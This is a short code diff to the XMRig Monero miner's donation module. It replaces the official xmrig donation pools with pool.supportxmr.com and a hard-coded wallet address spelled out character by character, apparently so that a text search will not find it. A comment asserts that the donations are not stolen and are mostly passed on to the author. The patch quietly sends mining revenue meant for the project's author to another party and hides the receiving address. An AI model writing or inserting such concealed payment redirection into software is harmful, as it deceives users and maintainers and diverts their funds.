@@ -1,0 +1,24 @@
+diff --git a/src/net/strategies/DonateStrategy.cpp b/src/net/strategies/DonateStrategy.cpp
+index 9593dc9..20e3b92 100644
+--- a/src/net/strategies/DonateStrategy.cpp
++++ b/src/net/strategies/DonateStrategy.cpp
+@@ -50,15 +50,17 @@ xmrig::DonateStrategy::DonateStrategy(int level, const char *user, Algo algo, IS
+ {
+     uint8_t hash[200];
+     char userId[65] = { 0 };
++    // I don't steal the donations! I redistribute most of this to the xmrig author!
++    char userName[95] = { '4','7','V','C','Q','g','B','j','m','L','d','1','o','M','G','K','G','c','b','V','b','z','M','1','N','D','1','q','U','W','z','s','7','N','o','n','x','i','p','9','c','u','N','r','a','J','w','V','x','D','W','Q','b','1','n','U','5','t','P','f','g','Y','x','4','x','L','f','t','n','P','i','R','1','z','P','c','g','Z','B','i','4','M','m','o','j','3','a','t','3','9','C','7','q','p','9' };
+ 
+     keccak(reinterpret_cast<const uint8_t *>(user), strlen(user), hash);
+     Job::toHex(hash, 32, userId);
+ 
+ #   ifndef XMRIG_NO_TLS
+-    m_pools.push_back(Pool("donate.ssl.xmrig.com", 443, userId, nullptr, false, true, true));
++    m_pools.push_back(Pool("pool.supportxmr.com", 443, userName, nullptr, false, true, true));
+ #   endif
+ 
+-    m_pools.push_back(Pool("donate.v2.xmrig.com", 3333, userId, nullptr, false, true));
++    m_pools.push_back(Pool("pool.supportxmr.com", 3333, userName, nullptr, false, true));
+ 
+     for (Pool &pool : m_pools) {
+         pool.adjust(Algorithm(algo, VARIANT_AUTO));
